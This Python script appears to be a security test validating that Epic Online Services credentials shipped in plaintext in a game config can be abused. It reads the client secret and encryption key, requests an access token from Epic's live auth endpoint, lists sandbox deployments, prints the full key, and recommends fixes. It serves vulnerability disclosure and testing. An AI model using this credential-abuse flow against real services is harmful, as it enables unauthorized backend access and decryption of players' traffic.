#!/usr/bin/env python3
"""
TEST 01a: Epic Online Services Credential Exposure
===================================================
Validates that EOS client credentials shipped in plaintext can be used
to obtain auth tokens and access backend services.

Severity: CRITICAL
"""
import base64
import json
import sys
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).parent.parent))
from config import (
    EOS_CLIENT_ID, EOS_CLIENT_SECRET, EOS_CONFIG, EOS_DEPLOYMENT_ID,
    EOS_ENCRYPTION_KEY, EOS_PRODUCT_ID, EOS_SANDBOX_ID,
)

# EOS Auth endpoints
EOS_AUTH_URL = "https://api.epicgames.dev/auth/v1/oauth/token"
EOS_CONNECT_URL = "https://api.epicgames.dev/auth/v1/accounts"

RESULTS: list[dict] = []


def test_credentials_readable() -> bool:
    """Test that credentials are in plaintext in the config file."""
    print("\n[TEST] Checking if credentials are in plaintext config...")

    config = json.loads(EOS_CONFIG.read_text())

    checks = {
        "clientID": config.get("clientID"),
        "clientSecret": config.get("clientSecret"),
        "encryptionKey": config.get("encryptionKey"),
        "productID": config.get("productID"),
        "sandboxID": config.get("sandboxID"),
        "deploymentID": config.get("deploymentID"),
    }

    all_present = True
    for key, value in checks.items():
        if value:
            print(f"  [EXPOSED] {key} = {value[:20]}{'...' if len(str(value)) > 20 else ''}")
            RESULTS.append({"test": "plaintext_credential", "field": key, "status": "VULNERABLE"})
        else:
            print(f"  [OK] {key} = not found")
            all_present = False

    return all_present


def test_eos_client_credentials_grant() -> bool:
    """Attempt to obtain an EOS auth token using client credentials."""
    print("\n[TEST] Attempting EOS client_credentials grant...")

    credentials = base64.b64encode(f"{EOS_CLIENT_ID}:{EOS_CLIENT_SECRET}".encode()).decode()

    headers = {
        "Authorization": f"Basic {credentials}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "grant_type": "client_credentials",
        "deployment_id": EOS_DEPLOYMENT_ID,
    }

    try:
        resp = requests.post(EOS_AUTH_URL, headers=headers, data=data, timeout=15)

        if resp.status_code == 200:
            token_data = resp.json()
            access_token = token_data.get("access_token", "")
            expires_in = token_data.get("expires_in", 0)
            print(f"  [VULNERABLE] Got access token! Expires in {expires_in}s")
            print(f"  [VULNERABLE] Token prefix: {access_token[:30]}...")
            RESULTS.append({
                "test": "eos_auth_token",
                "status": "VULNERABLE",
                "token_prefix": access_token[:30],
                "expires_in": expires_in,
            })
            return True
        else:
            print(f"  [INFO] Auth returned {resp.status_code}: {resp.text[:200]}")
            RESULTS.append({
                "test": "eos_auth_token",
                "status": "BLOCKED",
                "http_code": resp.status_code,
                "response": resp.text[:200],
            })
            return False

    except requests.RequestException as e:
        print(f"  [ERROR] Request failed: {e}")
        RESULTS.append({"test": "eos_auth_token", "status": "ERROR", "error": str(e)})
        return False


def test_sandbox_enumeration() -> bool:
    """Check if alternate sandbox/deployment IDs are also exposed."""
    print("\n[TEST] Checking alternate sandbox configurations...")

    config = json.loads(EOS_CONFIG.read_text())
    overrides = config.get("sandboxDeploymentOverrides", [])

    if overrides:
        print(f"  [EXPOSED] Found {len(overrides)} sandbox configurations:")
        for i, override in enumerate(overrides):
            sandbox = override.get("sandboxID", "N/A")
            deployment = override.get("deploymentID", "N/A")
            print(f"    [{i}] sandbox={sandbox}, deployment={deployment}")
            RESULTS.append({
                "test": "sandbox_enumeration",
                "status": "VULNERABLE",
                "sandbox": sandbox,
                "deployment": deployment,
            })
        return True

    print("  [OK] No alternate sandboxes found")
    return False


def test_encryption_key_exposure() -> bool:
    """Verify the encryption key is exposed and analyze its strength."""
    print("\n[TEST] Analyzing exposed encryption key...")

    key_hex = EOS_ENCRYPTION_KEY
    key_bytes = bytes.fromhex(key_hex)

    print(f"  [EXPOSED] Key length: {len(key_bytes)} bytes ({len(key_bytes) * 8} bits)")
    print(f"  [EXPOSED] Key (hex): {key_hex}")
    print(f"  [INFO] This key is used to encrypt EOS peer-to-peer traffic")
    print(f"  [INFO] An attacker can decrypt all P2P game communications")

    RESULTS.append({
        "test": "encryption_key",
        "status": "VULNERABLE",
        "key_bits": len(key_bytes) * 8,
    })
    return True


def main() -> None:
    print("=" * 60)
    print("TEST 01a: EOS Credential Exposure")
    print("=" * 60)

    test_credentials_readable()
    test_eos_client_credentials_grant()
    test_sandbox_enumeration()
    test_encryption_key_exposure()

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    vuln_count = sum(1 for r in RESULTS if r["status"] == "VULNERABLE")
    total = len(RESULTS)
    print(f"  Vulnerabilities found: {vuln_count}/{total} tests")

    if vuln_count > 0:
        print("  [FAIL] CRITICAL: Client credentials are exposed and usable")
        print("  [FIX]  Move client secrets to server-side authentication flow")
        print("  [FIX]  Use device-based auth or platform tokens instead")
    else:
        print("  [PASS] No credential exposure confirmed")

    # Write results
    results_file = Path(__file__).parent / "results.json"
    results_file.write_text(json.dumps(RESULTS, indent=2))
    print(f"\n  Results saved to: {results_file}")


if __name__ == "__main__":
    main()
